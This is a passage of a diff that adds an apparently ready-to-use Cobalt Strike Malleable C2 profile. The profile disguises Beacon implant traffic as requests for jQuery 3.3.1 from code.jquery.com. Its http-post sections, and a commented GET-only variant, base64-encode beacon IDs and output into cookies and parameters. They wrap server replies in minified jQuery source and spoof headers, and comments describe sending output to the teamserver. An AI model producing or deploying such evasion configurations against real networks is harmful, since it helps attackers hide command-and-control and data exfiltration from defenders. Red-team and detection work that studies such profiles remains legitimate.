t.prevObject&#x3D;this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t&#x3D;this.length,n&#x3D;+e+(e&lt;0?t:0);return this.pushStack(n&gt;&#x3D;0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend&#x3D;w.fn.extend&#x3D;function()&#123;var e,t,n,r,i,o,a&#x3D;arguments[0]||&#123;&#125;,s&#x3D;1,u&#x3D;arguments.length,l&#x3D;!1;for(\&quot;boolean\&quot;&#x3D;&#x3D;typeof a&amp;&amp;(l&#x3D;a,a&#x3D;arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;&#x3D;&#x3D;typeof a||g(a)||(a&#x3D;&#123;&#125;),s&#x3D;&#x3D;&#x3D;u&amp;&amp;(a&#x3D;this,s--);s&lt;u;s++)if(null!&#x3D;(e&#x3D;arguments[s]))for(t in e)n&#x3D;a[t],a!&#x3D;&#x3D;(r&#x3D;e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i&#x3D;Array.isArray(r)))?(i?(i&#x3D;!1,o&#x3D;n&amp;&amp;Array.isArray(n)?n:[]):o&#x3D;n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]&#x3D;w.extend(l,o,r)):void 0!&#x3D;&#x3D;r&amp;&amp;(a[t]&#x3D;r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(&#x2F;\\D&#x2F;g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!&#x3D;&#x3D;c.call(e))&amp;&amp;(!(t&#x3D;i(e))||\&quot;function\&quot;&#x3D;&#x3D;typeof(n&#x3D;f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)&#x3D;&#x3D;&#x3D;d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r&#x3D;0;if(C(e))&#123;for(n&#x3D;e.length;r&lt;n;r++)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null&#x3D;&#x3D;e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n&#x3D;t||[];return null!&#x3D;e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;&#x3D;&#x3D;typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null&#x3D;&#x3D;t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n&#x3D;+t.length,r&#x3D;0,i&#x3D;e.length;r&lt;n;r++)e[i++]&#x3D;t[r];return e.length&#x3D;i,e&#125;,grep:function(e,t,n)&#123;for(var r,i&#x3D;[],o&#x3D;0,a&#x3D;e.length,s&#x3D;!n;o&lt;a;o++)(r&#x3D;!t(e[o],o))!&#x3D;&#x3D;s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o&#x3D;0,s&#x3D;[];if(C(e))for(r&#x3D;e.length;o&lt;r;o++)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;&#x3D;&#x3D;typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]&#x3D;n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]&#x3D;t.toLowerCase()&#125;);function C(e)&#123;var t&#x3D;!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n&#x3D;x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;&#x3D;&#x3D;&#x3D;n||0&#x3D;&#x3D;&#x3D;t||\&quot;number\&quot;&#x3D;&#x3D;typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E&#x3D;function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b&#x3D;\&quot;sizzle\&quot;+1*new Date,w&#x3D;e.document,T&#x3D;0,C&#x3D;0,E&#x3D;ae(),k&#x3D;ae(),S&#x3D;ae(),D&#x3D;function(e,t)&#123;return e&#x3D;&#x3D;&#x3D;t&amp;&amp;(f&#x3D;!0),0&#125;,N&#x3D;&#123;&#125;.hasOwnProperty,A&#x3D;[],j&#x3D;A.pop,q&#x3D;A.push,L&#x3D;A.push,H&#x3D;A.slice,O&#x3D;function(e,t)&#123;for(var n&#x3D;0,r&#x3D;e.length;n&lt;r;n++)if(e[n]&#x3D;&#x3D;&#x3D;t)return n;return-1&#125;,P&#x3D;\&quot;\r&quot;;
+            # 1st Line
+            #prepend &quot;&#x2F;*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org&#x2F;license *&#x2F;&quot;;
+            #append &quot;\&quot;.(o&#x3D;t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0&#x3D;&#x3D;&#x3D;i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]&#x3D;function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1&#x3D;&#x3D;&#x3D;arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy&#x3D;function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;&#x3D;&#x3D;typeof t&amp;&amp;(n&#x3D;e[t],t&#x3D;e,e&#x3D;n),g(e))return r&#x3D;o.call(arguments,2),i&#x3D;function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid&#x3D;e.guid&#x3D;e.guid||w.guid++,i&#125;,w.holdReady&#x3D;function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray&#x3D;Array.isArray,w.parseJSON&#x3D;JSON.parse,w.nodeName&#x3D;N,w.isFunction&#x3D;g,w.isWindow&#x3D;y,w.camelCase&#x3D;G,w.type&#x3D;x,w.now&#x3D;Date.now,w.isNumeric&#x3D;function(e)&#123;var t&#x3D;w.type(e);return(\&quot;number\&quot;&#x3D;&#x3D;&#x3D;t||\&quot;string\&quot;&#x3D;&#x3D;&#x3D;t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;&#x3D;&#x3D;typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt&#x3D;e.jQuery,Kt&#x3D;e.$;return w.noConflict&#x3D;function(t)&#123;return e.$&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.$&#x3D;Kt),t&amp;&amp;e.jQuery&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.jQuery&#x3D;Jt),w&#125;,t||(e.jQuery&#x3D;e.$&#x3D;w),w&#125;);&quot;;
+            print;
+        &#125;
+    &#125;
+&#125;
+
+################################################
+## HTTP POST
+################################################
+## Description:
+##    POST is used to send output to the teamserver
+##    Can use HTTP GET or POST to send data
+##    Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel.
+## Defaults:
+##    uri &quot;&#x2F;activity&quot;
+##    Headers (Sample)
+##      Accept: *&#x2F;*
+##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31&#x2F;5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3&#x2F;aK0MnXoM&#x3D;
+##      User-Agent Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident&#x2F;4.0; SV1)
+## Guidelines:
+##    - Decide if you want to use HTTP GET or HTTP POST requests for this section
+##    - Add customize HTTP headers to the HTTP traffic of your campaign
+##    - Analyze sample HTTP traffic to use as a reference
+## Use HTTP POST for http-post section
+## Uncomment this Section to activate
+http-post &#123;
+
+    set uri &quot;&#x2F;api&#x2F;post&quot;;
+    set verb &quot;POST&quot;;
+
+    client &#123;
+
+        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;
+        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
+        header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;&quot;;
+        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
+       
+        id &#123;      
+            base64;
+            prepend &quot;JSESSION&#x3D;&quot;;
+            header &quot;Cookie&quot;;            
+        &#125;
+              
+        output &#123;
+            base64;
+            print;
+        &#125;
+    &#125;
+
+    server &#123;
+
+        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;
+        header &quot;Connection&quot; &quot;keep-alive&quot;;
+        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;
+
+        output &#123;
+            base64;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            #prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;&#x3D;&#x3D;typeof module&amp;&amp;\&quot;object\&quot;&#x3D;&#x3D;typeof module.exports?module.exports&#x3D;e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!&#x3D;typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n&#x3D;[],r&#x3D;e.document,i&#x3D;Object.getPrototypeOf,o&#x3D;n.slice,a&#x3D;n.concat,s&#x3D;n.push,u&#x3D;n.indexOf,l&#x3D;&#123;&#125;,c&#x3D;l.toString,f&#x3D;l.hasOwnProperty,p&#x3D;f.toString,d&#x3D;p.call(Object),h&#x3D;&#123;&#125;,g&#x3D;function e(t)&#123;return\&quot;function\&quot;&#x3D;&#x3D;typeof t&amp;&amp;\&quot;number\&quot;!&#x3D;typeof t.nodeType&#125;,y&#x3D;function e(t)&#123;return null!&#x3D;t&amp;&amp;t&#x3D;&#x3D;&#x3D;t.window&#125;,v&#x3D;&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o&#x3D;(t&#x3D;t||r).createElement(\&quot;script\&quot;);if(o.text&#x3D;e,n)for(i in v)n[i]&amp;&amp;(o[i]&#x3D;n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null&#x3D;&#x3D;e?e+\&quot;\&quot;:\&quot;object\&quot;&#x3D;&#x3D;typeof e||\&quot;function\&quot;&#x3D;&#x3D;typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b&#x3D;\&quot;3.3.1\&quot;,w&#x3D;function(e,t)&#123;return new w.fn.init(e,t)&#125;,T&#x3D;&#x2F;^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$&#x2F;g;w.fn&#x3D;w.prototype&#x3D;&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null&#x3D;&#x3D;e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t&#x3D;w.merge(this.constructor(),e);return t.prevObject&#x3D;this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t&#x3D;this.length,n&#x3D;+e+(e&lt;0?t:0);return this.pushStack(n&gt;&#x3D;0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend&#x3D;w.fn.extend&#x3D;function()&#123;var e,t,n,r,i,o,a&#x3D;arguments[0]||&#123;&#125;,s&#x3D;1,u&#x3D;arguments.length,l&#x3D;!1;for(\&quot;boolean\&quot;&#x3D;&#x3D;typeof a&amp;&amp;(l&#x3D;a,a&#x3D;arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;&#x3D;&#x3D;typeof a||g(a)||(a&#x3D;&#123;&#125;),s&#x3D;&#x3D;&#x3D;u&amp;&amp;(a&#x3D;this,s--);s&lt;u;s++)if(null!&#x3D;(e&#x3D;arguments[s]))for(t in e)n&#x3D;a[t],a!&#x3D;&#x3D;(r&#x3D;e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i&#x3D;Array.isArray(r)))?(i?(i&#x3D;!1,o&#x3D;n&amp;&amp;Array.isArray(n)?n:[]):o&#x3D;n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]&#x3D;w.extend(l,o,r)):void 0!&#x3D;&#x3D;r&amp;&amp;(a[t]&#x3D;r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(&#x2F;\\D&#x2F;g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!&#x3D;&#x3D;c.call(e))&amp;&amp;(!(t&#x3D;i(e))||\&quot;function\&quot;&#x3D;&#x3D;typeof(n&#x3D;f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)&#x3D;&#x3D;&#x3D;d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r&#x3D;0;if(C(e))&#123;for(n&#x3D;e.length;r&lt;n;r++)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null&#x3D;&#x3D;e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n&#x3D;t||[];return null!&#x3D;e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;&#x3D;&#x3D;typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null&#x3D;&#x3D;t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n&#x3D;+t.length,r&#x3D;0,i&#x3D;e.length;r&lt;n;r++)e[i++]&#x3D;t[r];return e.length&#x3D;i,e&#125;,grep:function(e,t,n)&#123;for(var r,i&#x3D;[],o&#x3D;0,a&#x3D;e.length,s&#x3D;!n;o&lt;a;o++)(r&#x3D;!t(e[o],o))!&#x3D;&#x3D;s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o&#x3D;0,s&#x3D;[];if(C(e))for(r&#x3D;e.length;o&lt;r;o++)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;&#x3D;&#x3D;typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]&#x3D;n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]&#x3D;t.toLowerCase()&#125;);function C(e)&#123;var t&#x3D;!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n&#x3D;x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;&#x3D;&#x3D;&#x3D;n||0&#x3D;&#x3D;&#x3D;t||\&quot;number\&quot;&#x3D;&#x3D;typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E&#x3D;function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b&#x3D;\&quot;sizzle\&quot;+1*new Date,w&#x3D;e.document,T&#x3D;0,C&#x3D;0,E&#x3D;ae(),k&#x3D;ae(),S&#x3D;ae(),D&#x3D;function(e,t)&#123;return e&#x3D;&#x3D;&#x3D;t&amp;&amp;(f&#x3D;!0),0&#125;,N&#x3D;&#123;&#125;.hasOwnProperty,A&#x3D;[],j&#x3D;A.pop,q&#x3D;A.push,L&#x3D;A.push,H&#x3D;A.slice,O&#x3D;function(e,t)&#123;for(var n&#x3D;0,r&#x3D;e.length;n&lt;r;n++)if(e[n]&#x3D;&#x3D;&#x3D;t)return n;return-1&#125;,P&#x3D;\&quot;\r&quot;;
+            # 1st Line
+            #prepend &quot;&#x2F;*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org&#x2F;license *&#x2F;&quot;;
+            #append &quot;\&quot;.(o&#x3D;t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0&#x3D;&#x3D;&#x3D;i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]&#x3D;function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1&#x3D;&#x3D;&#x3D;arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy&#x3D;function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;&#x3D;&#x3D;typeof t&amp;&amp;(n&#x3D;e[t],t&#x3D;e,e&#x3D;n),g(e))return r&#x3D;o.call(arguments,2),i&#x3D;function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid&#x3D;e.guid&#x3D;e.guid||w.guid++,i&#125;,w.holdReady&#x3D;function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray&#x3D;Array.isArray,w.parseJSON&#x3D;JSON.parse,w.nodeName&#x3D;N,w.isFunction&#x3D;g,w.isWindow&#x3D;y,w.camelCase&#x3D;G,w.type&#x3D;x,w.now&#x3D;Date.now,w.isNumeric&#x3D;function(e)&#123;var t&#x3D;w.type(e);return(\&quot;number\&quot;&#x3D;&#x3D;&#x3D;t||\&quot;string\&quot;&#x3D;&#x3D;&#x3D;t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;&#x3D;&#x3D;typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt&#x3D;e.jQuery,Kt&#x3D;e.$;return w.noConflict&#x3D;function(t)&#123;return e.$&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.$&#x3D;Kt),t&amp;&amp;e.jQuery&#x3D;&#x3D;&#x3D;w&amp;&amp;(e.jQuery&#x3D;Jt),w&#125;,t||(e.jQuery&#x3D;e.$&#x3D;w),w&#125;);&quot;;
+            print;
+        &#125;
+    &#125;
+&#125;
+
+## GET only beacon
+## Use HTTP GET for http-post section
+## Uncomment this Section to activate an GET only beacon
+# http-post &#123;
+
+#     set uri &quot;&#x2F;jquery-3.3.2.min.js&quot;;
+#     set verb &quot;GET&quot;;
+
+#     client &#123;
+
+#         header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&quot;;
+#         #header &quot;Host&quot; &quot;code.jquery.com&quot;;
+#         header &quot;Referer&quot; &quot;http:&#x2F;&#x2F;code.jquery.com&#x2F;&quot;;
+#         header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
+       
+#         id &#123;
+#             mask;       
+#             base64url;
+#             parameter &quot;__cfduid&quot;;            
+#         &#125;
+              
+#         output &#123;
+#             mask;
+#             base64url;
+# 			  parameter &quot;__tg&quot;;
+#         &#125;
+#     &#125;
+
+#     server &#123;
+
+#         header &quot;Server&quot; &quot;NetDNA-cache&#x2F;2.2&quot;;
+#         header &quot;Cache-Control&quot; &quot;max-age&#x3D;0, no-cache&quot;;
+#         header &quot;Pragma&quot; &quot;no-cache&quot;;
+#         header &quot;Connection&quot; &quot;keep-alive&quot;;
+#         header &quot;Content-Type&quot; &quot;application&#x2F;javascript; charset&#x3D;utf-8&quot;;
+
+#         output &#123;
+#             mask;
+#             base64url;
+#             ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+#             # 2nd Line            
+#             prepend &quot;!function(e,t)&#123;\&quot;use strict\&quot;;\&quot;object\&quot;&#x3D;&#x3D;typeof module&amp;&amp;\&quot;object\&quot;&#x3D;&#x3D;typeof module.exports?module.exports&#x3D;e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!&#x3D;typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n&#x3D;[],r&#x3D;e.document,i&#x3D;Object.getPrototypeOf,o&#x3D;n.slice,a&#x3D;n.concat,s&#x3D;n.push,u&#x3D;n.indexOf,l&#x3D;&#123;&#125;,c&#x3D;l.toString,f&#x3D;l.hasOwnProperty,p&#x3D;f.toString,d&#x3D;p.call(Object),h&#x3D;&#123;&#125;,g&#x3D;function e(t)&#123;return\&quot;function\&quot;&#x3D;&#x3D;typeof t&amp;&amp;\&quot;number\&quot;!&#x3D;typeof t.nodeType&#125;,y&#x3D;function e(t)&#123;return null!&#x3D;t&amp;&amp;t&#x3D;&#x3D;&#x3D;t.window&#125;,v&#x3D;&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o&#x3D;(t&#x3D;t||r).createElement(\&quot;script\&quot;);if(o.text&#x3D;e,n)for(i in v)n[i]&amp;&amp;(o[i]&#x3D;n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null&#x3D;&#x3D;e?e+\&quot;\&quot;:\&quot;object\&quot;&#x3D;&#x3D;typeof e||\&quot;function\&quot;&#x3D;&#x3D;typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b&#x3D;\&quot;3.3.1\&quot;,w&#x3D;function(e,t)&#123;return new w.fn.init(e,t)&#125;,T&#x3D;&#x2F;^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$&#x2F;g;w.fn&#x3D;w.prototype&#x3D;&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null&#x3D;&#x3D;e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t&#x3D;w.merge(this.constructor(),e);return t.prevObject&#x3D;this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t&#x3D;this.length,n&#x3D;+e+(e&lt;0?t:0);return this.pushStack(n&gt;&#x3D;0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend&#x3D;w.fn.extend&#x3D;function()&#123;var e,t,n,r,i,o,a&#x3D;arguments[0]||&#123;&#125;,s&#x3D;1,u&#x3D;arguments.length,l&#x3D;!1;for(\&quot;boolean\&quot;&#x3D;&#x3D;typeof a&amp;&amp;(l&#x3D;a,a&#x3D;arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;&#x3D;&#x3D;typeof a||g(a)||(a&#x3D;&#123;&#125;),s&#x3D;&#x3D;&#x3D;u&amp;&amp;(a&#x3D;this,s--);s&lt;u;s++)if(null!&#x3D;(e&#x3D;arguments[s]))for(t in e)n&#x3D;a[t],a!&#x3D;&#x3D;(r&#x3D;e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i&#x3D;Array.isArray(r)))?(i?(i&#x3D;!1,o&#x3D;n&amp;&amp;Array.isArray(n)?n:[]):o&#x3D;n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]&#x3D;w.extend(l,o,r)):void 0!&#x3D;&#x3D;r&amp;&amp;(a[t]&#x3D;r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(&#x2F;\\D&#x2F;g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!&#x3D;&#x3D;c.call(e))&amp;&amp;(!(t&#x3D;i(e))||\&quot;function\&quot;&#x3D;&#x3D;typeof(n&#x3D;f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)&#x3D;&#x3D;&#x3D;d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r&#x3D;0;if(C(e))&#123;for(n&#x3D;e.length;r&lt;n;r++)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1&#x3D;&#x3D;&#x3D;t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null&#x3D;&#x3D;e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n&#x3D;t||[];return null!&#x3D;e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;&#x3D;&#x3D;typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null&#x3D;&#x3D;t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n&#x3D;+t.length,r&#x3D;0,i&#x3D;e.length;r&lt;n;r++)e[i++]&#x3D;t[r];return e.length&#x3D;i,e&#125;,grep:function(e,t,n)&#123;for(var r,i&#x3D;[],o&#x3D;0,a&#x3D;e.length,s&#x3D;!n;o&lt;a;o++)(r&#x3D;!t(e[o],o))!&#x3D;&#x3D;s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o&#x3D;0,s&#x3D;[];if(C(e))for(r&#x3D;e.length;o&lt;r;o++)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!&#x3D;(i&#x3D;t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;&#x3D;&#x3D;typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]&#x3D;n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]&#x3D;t.toLowerCase()&#125;);function C(e)&#123;var t&#x3D;!!e&amp;&amp;\&quot;length\&quot;in 